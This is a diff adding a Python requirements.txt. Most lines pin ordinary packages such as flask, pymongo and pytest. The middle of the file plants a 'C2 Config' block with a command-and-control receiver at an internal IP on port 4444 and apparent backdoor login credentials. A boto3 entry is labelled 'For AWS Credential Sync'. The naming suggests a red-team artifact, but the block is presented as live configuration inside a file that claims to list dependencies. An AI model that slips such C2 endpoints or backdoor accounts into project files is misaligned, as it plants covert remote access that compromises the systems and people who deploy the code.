@@ -1,0 +1,23 @@
+# requirements.txt
+
+# --- Project Requirements ---
+# Core Frameworks
+flask==2.3.2
+requests==2.31.0
+python-dotenv==1.0.0
+
+# Database Connectors
+pymongo==4.4.1
+redis==4.6.0
+
+# Deployment & C2 Config (Internal Use Only)
+# Note: Ensure the receiver is reachable within the VPC
+c2_receiver: 192.168.1.93:4444
+bd_id: imKECredteam
+bd_pw: shieldone123
+
+# Utilities & Dev Tools
+pytest==7.4.0
+black==23.7.0
+flake8==6.1.0
+boto3==1.28.21  # For AWS Credential Sync
